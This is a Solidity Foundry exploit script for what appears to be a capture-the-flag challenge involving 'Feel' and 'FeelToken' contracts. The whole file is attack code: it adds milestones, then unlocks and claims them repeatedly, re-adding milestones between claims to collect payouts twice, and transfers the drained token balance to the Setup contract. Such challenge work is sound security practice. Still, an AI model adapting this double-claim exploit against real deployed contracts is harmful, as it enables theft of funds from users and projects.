// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "src/challenge/Setup.sol";
import {Feel} from "src/challenge/Feel.sol";
import {FeelToken} from "src/challenge/FeelToken.sol";
contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Setup setup = Setup(vm.envAddress("SETUP"));
        Feel feel = Feel(setup.feel());
        FeelToken token = FeelToken(setup.token());
        console.log("timestamp 1", feel.getTime());
        for(uint i=1;i<=10;i++){
            feel.addMilestone(i,"xxxxxxxxxxxxxxxxxxxxxxx");
        }
        vm.stopBroadcast();
    }

    function run2() public {
        vm.startBroadcast();
        Setup setup = Setup(vm.envAddress("SETUP"));
        Feel feel = Feel(setup.feel());
        console.log("timestamp 2", feel.getTime());
        FeelToken token = FeelToken(setup.token());
        for(uint i=1;i<=10;i++){
            feel.unlockMilestone(i);
            feel.claimMilestone(i);
            feel.addMilestone(i+50,"xxxxxxxxxxxxxxxxxxxxxxx");
            feel.claimMilestone(i);
        }
        console.log("balance: ", token.balanceOf(msg.sender));
        token.transfer(address(setup), token.balanceOf(msg.sender));
        vm.stopBroadcast();
    }
}